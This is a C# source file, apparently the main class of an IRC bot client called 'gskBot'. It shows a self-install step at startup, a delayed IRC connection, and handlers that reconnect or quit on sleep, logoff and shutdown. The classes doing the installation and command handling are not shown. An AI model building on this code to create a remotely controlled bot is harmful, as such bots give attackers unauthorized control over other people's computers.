#region Imports
using System.Threading;
using Microsoft.Win32;
//using System.Reflection;
#endregion

#region Assembly
/*
[assembly: AssemblyTitle("")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("")]
[assembly: AssemblyCopyright("")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("00000000-0000-0000-0000-000000000000")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
*/
#endregion

namespace gskBot {
    class Bot {
        #region Startup
        static void Main() {
            if (Config.Startup) Function.Install();
            SystemEvents.PowerModeChanged += SessionEvents;
            SystemEvents.SessionEnding    += PowerEvents;
            Thread.Sleep(Config.ConnectionDelay);
            IRC.Connect();
        }
        #endregion

        #region Events
        static void PowerEvents(object sender, SessionEndingEventArgs e) {
            switch (e.Reason) {
                case SessionEndReasons.Logoff:
                    if (IRC.Connected) IRC.Quit("LOGOFF");
                    break;
                case SessionEndReasons.SystemShutdown:
                    if (IRC.Connected) IRC.Quit("SHUTDOWN");
                    break;
            }
        }

        static void SessionEvents(object sender, PowerModeChangedEventArgs e) {
            switch (e.Mode) {
                case PowerModes.Resume:
                    IRC.Connect();
                    break;
                case PowerModes.Suspend:
                    if (IRC.Connected) IRC.Quit("SLEEP");
                    break;
            }
        }
        #endregion
    }
}